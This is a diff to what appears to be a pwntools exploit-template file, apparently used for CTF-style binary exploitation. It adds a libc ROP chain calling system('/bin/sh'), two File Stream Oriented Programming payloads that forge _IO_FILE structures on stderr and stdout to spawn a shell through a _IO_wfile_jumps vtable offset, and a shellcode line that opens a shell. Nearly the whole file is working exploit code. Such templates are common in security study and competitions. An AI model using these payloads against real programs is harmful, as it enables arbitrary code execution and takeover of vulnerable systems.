@@ -10,6 +10,13 @@ environ = libc.symbols["__environ"]
 payload = p64(pop_rdi) + p64(binsh_addr)
 payload += p64(system_addr)
 
+## 简单写法
+rop = ROP(libc)
+ret_gadget = rop.find_gadget(['ret'])[0]
+rop.raw(ret_gadget)
+rop.call('system', [next(libc.search(b'/bin/sh\x00'))])
+rop_bytes = rop.chain()
+
 def ret2system():
     rop = ROP(libc)
     rop.raw(rop.ret.address)
@@ -29,20 +36,36 @@ payload = flat(
     0x0, 0x0, 0x0, (io_file-0xe0)+0xc0, 0x0, 0x0,
     vtable)
 
-# FSOP2
+# FSOP stder
+stderr_adr = libc.symbols["_IO_2_1_stderr_"]
+log.success("stderr :-----> " + hex(stderr_adr))
+
 file = FileStructure(0)
 file.flags = u64(p32(0xfbad0101) + b";sh\0")
-file._IO_save_end = libc.sym["system"]
+file._IO_save_end = libc.symbols["system"]
 file._lock = stderr_adr - 0x10
 file._wide_data = stderr_adr - 0x10
 file._offset = 0
 file._old_offset = 0
-payload = b"\x00"*24 + p32(1) + p32(0) + p64(0)
+payload = p64(0)*3 + p32(1) + p32(0) + p64(0)
 payload += p64(libc.symbols["_IO_2_1_stderr_"] - 0x10)
 payload += p64(libc.symbols["_IO_wfile_jumps"] + 0x18 - 0x58)
 file.unknown2 = payload
 
 bytes(file)
+
+# FSOP stdout
+_IO_2_1_stdout_ = libc.symbols['_IO_2_1_stdout_']
+system = libc.symbols['system']
+fp = FileStructure(0)
+fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
+fp._IO_read_end = system
+fp._lock = _IO_2_1_stdout_ + 0x50
+fp._wide_data = _IO_2_1_stdout_ - 0x10
+fp.unknown2 = p64(0) * 3 + p64(0xffffffff) + p64(0) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)
+fp.vtable = libc.symbols['_IO_wfile_jumps'] - 0x20
+payload = bytes(fp)
+
 
 # shellcode
 shellcode = asm(shellcraft.amd64.linux.sh())
